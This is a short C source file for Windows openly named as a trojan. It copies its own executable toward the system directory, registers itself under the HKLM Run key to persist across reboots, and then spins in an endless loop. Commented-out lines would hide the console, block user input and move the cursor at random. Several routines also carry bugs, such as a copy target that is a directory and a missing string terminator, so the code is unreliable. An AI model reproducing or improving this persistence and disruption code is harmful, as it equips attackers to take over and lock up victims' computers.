#include "Trojan.h"
#include "Injector.h"

PTCHAR GetFilename(const PTCHAR filepath, size_t length)
{
	size_t i = strlen(filepath) - 1;
	for (; i != 0 && filepath[i] != '\\' && filepath[i] != '/'; --i);

	size_t filename_length = 0;
	while (filepath[i++] != '\0')
		filename_length++;

	PTCHAR filename = (PTCHAR)malloc(filename_length);
	if (!filename)
	{
		printf("Cannot allocate memory for filename.\n");

		return NULL;
	}
	memcpy(filename, filepath + i - filename_length, filename_length);

	return filename;
}

BOOL InitTrojan()
{
	TCHAR filepath[LARGE_BUFFER_LENGTH] = "";
	if(!GetModuleFileName(NULL, filepath, LARGE_BUFFER_LENGTH))
	{
		PrintError("GetModuleFileName");

		return FALSE;
	}

	TCHAR sysdir[SMALL_BUFFER_LENGTH] = "";
	if(!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
	{
		PrintError("GetSystemDirectory");

		return FALSE;
	}

	if (!CopyFileEx(filepath, sysdir, NULL, NULL, FALSE, COPY_FILE_OPEN_SOURCE_FOR_WRITE))
	{
		PrintError("CopyFileEx");

		return FALSE;
	}

	PTCHAR filename = GetFilename(filepath, LARGE_BUFFER_LENGTH);
	if (!filename)
	{
		printf("Cannot get filename.\n");

		return FALSE;
	}

	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0ul, KEY_WRITE, &hKey) != ERROR_SUCCESS)
	{
		PrintError("RegOpenKeyEx");

		free(filename);

		return FALSE;
	}

	if (RegSetValueEx(hKey, filename, 0ul, REG_EXPAND_SZ, sysdir, SMALL_BUFFER_LENGTH) != ERROR_SUCCESS)
	{
		PrintError("RegSetValueEx");
		if (RegCloseKey(hKey) != ERROR_SUCCESS)
			PrintError("RegCloseKey");

		free(filename);

		return FALSE;
	}

	if (RegCloseKey(hKey) != ERROR_SUCCESS)
	{
		PrintError("RegCloseKey");
		
		free(filename);

		return FALSE;
	}

	free(filename);

	return TRUE;
}

VOID StartTrojan()
{
	InitTrojan();
	// FreeConsole();
	// ShowWindow(GetForegroundWindow(), SW_HIDE);

	// int width  = GetDeviceCaps(GetDC(NULL), HORZRES),
	// 	   height = GetDeviceCaps(GetDC(NULL), VERTRES);

	while (TRUE)
	{
		// BlockInput(TRUE);
		// SetCursorPos(rand() % width, rand() % height);
		// Beep();
	}
}

